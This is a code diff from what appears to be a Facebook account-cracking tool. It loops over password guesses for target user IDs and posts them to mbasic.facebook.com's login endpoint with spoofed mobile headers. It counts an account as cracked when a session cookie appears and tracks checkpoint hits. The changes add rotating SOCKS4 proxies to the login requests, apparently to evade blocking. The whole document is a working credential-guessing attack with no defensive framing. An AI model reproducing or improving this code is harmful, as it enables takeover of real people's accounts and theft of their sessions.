@@ -1998,12 +1998,12 @@ def mbasicc(idf,pwv):
     loop+=1
 
 # ------------------[ METHODE REGULER ]-------------------#
-def reguleghr(idf,pwv):
+def mbasic(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(ugen)
+	ua = random.choice(baru)
 	ses = requests.Session()
-	prog.update(des,description=f" {K2}•{H2} REGULER {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.update(des,description=f" {K2}•{H2} UPDATE {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	for pw in pwv:
 		try:
@@ -2065,24 +2065,26 @@ def reguleghr(idf,pwv):
 
 
 
-def mbasic(idf,pwv):
+def mbasibhc(idf,pwv):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
     rc = random.choice
-    prog.update(des,description=f" {K2}•{H2} REGULER {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.update(des,description=f" {K2}•{H2} MBASIC {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
-    ua = random.choice(ugen2)
+    ua = random.choice(baru)
     for pw in pwv:
         try:
             if "ya" in ualuh: ua = ualu[0]
+            nip=random.choice(prox)
+            proxs= {'http': 'socks4://'+nip}
             ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
             p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D000b08fb-689b-45cc-a4f0-e3bb52a66842%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v12.0/dialog/oauth?encrypted_query_string=AeDsB_mIFREjNYDwuWOV6k5KfwSeC4nSl-8yAXLk5XCbopR9GlQNnen08SmfmGTmDFO7swiAtufmNBzLNoHVktViYNWLsMMsKFggcHqTBGw_qTfVzk3ml9EiKffgOgBnEqbn1YPNeupO5REfB_WT90ZWzs3lzjWnrzSipVowU4nkPHRy80GJSHDcwwwf41DcgWpcjnFmEIQxmC7D39UJZwdTW_ohl1mp3QDDn3dClMmGg4bFJFXNOHvC14kRR3Y9m32NGTPFzXmKUDeqdvpt_BsomYKPnJw3Sfe2poHNmgQ21QZ7dnztonslONMSAZoYjZuPsjAs31PH_4_gNjAGpodbr2-1l6pC4pvrlwzAi3m1fpF46rdYalexhL91PvuZsdWLjFmntZGRXm0I5jQUMPTz296eC46FLG5VT106opZy7W84b2LRNZI2zfC0n-YT0jWmUnOc8lo-8WcAO7A18WLpI3sO1RGuau8TyxcsUcgKWvwzEX6KzCuuR3sohzA-eNt_AcvpcJ04tDoWglO7Qf4VXNd6Wmr-B2QeId9MNufC3NttXzJaWjfv6iTv-JCnM2Gokwc_UPkomFvAEA7stKOytz1WR7ytP7h-2FwGTDGtQTuvh08Pf6CnjfImyq4PrwYLdEAQxsHtSR6conpdwwap3qTgf44q_zIDunU8g3iI7CSnrRh0YS_ZY5eejm6msy-ZLMXL208jYQb_HEr2jZS0tRP2AA6v8T96OFDXtIAhIEwM2ClBXM5FE9VRgS3TbbCZIGB3qZWvyiWTUn3PG-I3qyk9uehagsNZftcvGFnHYkB_OqPdLxoJiv9qV3lj-vhqPYbmuzHbuHhyDjGuu9B-mWtkKr-lXUXxUU9_phAftMiZ60iLRzFvK24bvxRorpUbEYC1pQcjGcQhkQ7VCV9Xo7RRmHAVCwRL73VSi3uboyMPuQi3DqPb18otubuTJ3XdqTFrgrWDaJcCytxCUPgL269zGnoFaxpHhvfPoe1KjWkZlOslzUxaWI6WgMGAhrY9ov20Gfuyw42SC-MZW2G7CBxYkMSsvZN_AfH70LVhp0JtuL6CGsr2qZ3CkE7odFoiUNxJf_NanKUdxbG38GXfb8Sf58_TDtGLzwRv&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2.625; wd=412x756'
             heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D000b08fb-689b-45cc-a4f0-e3bb52a66842%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
+            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
             if "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
                 coki = po.cookies.get_dict()
